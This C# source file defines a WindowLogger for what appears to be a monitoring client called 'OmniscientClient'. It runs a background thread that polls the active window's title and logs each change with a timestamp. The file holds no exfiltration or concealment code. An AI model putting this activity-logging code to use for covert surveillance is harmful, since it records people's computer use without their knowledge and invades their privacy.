using System.Runtime.InteropServices;
using System.Text;

namespace OmniscientClient
{
    class WindowLogger
    {
        
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        private IntPtr currentWindow = IntPtr.Zero;
        private string previousWindowTitle = string.Empty;

        public WindowLogger()
        {
            Thread windowLoggerThread = new Thread(new ThreadStart(Start));
            windowLoggerThread.Start();
        }
        private void Start()
        {
            while (true)
            {
                IntPtr handle = GetForegroundWindow();
                StringBuilder title = new StringBuilder(256);
                GetWindowText(handle, title, 256);
                string windowTitle = title.ToString();

                if (handle != currentWindow) {
                    currentWindow = handle;
                    if (!string.IsNullOrEmpty(windowTitle))
                    {
                        string currentWindowTitle = title.ToString();
                        if (currentWindowTitle != previousWindowTitle)
                        {
                            previousWindowTitle = currentWindowTitle;
                            Logger.Writer($"{DateTime.Now}: {windowTitle}", true);
                        }
                    }
                }
            }
        }
    }
}